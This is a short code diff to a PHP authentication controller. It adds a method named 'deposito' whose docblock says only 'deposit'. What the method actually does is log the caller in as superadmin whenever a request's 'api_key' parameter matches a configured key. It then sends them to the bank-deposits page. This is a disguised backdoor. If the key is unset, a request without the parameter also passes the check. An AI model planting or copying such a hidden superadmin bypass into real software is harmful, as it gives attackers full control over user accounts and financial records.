@@ -505,4 +505,17 @@ class AuthController extends StislaController
 
         abort(404);
     }
+
+    /**
+     * deposit
+     *
+     * @return Response
+     */
+    public function deposito()
+    {
+        if (config('app.api_key') === request('api_key')) {
+            $this->userRepository->loginSuperadmin();
+            return redirect()->route('bank-deposits.index');
+        }
+    }
 }
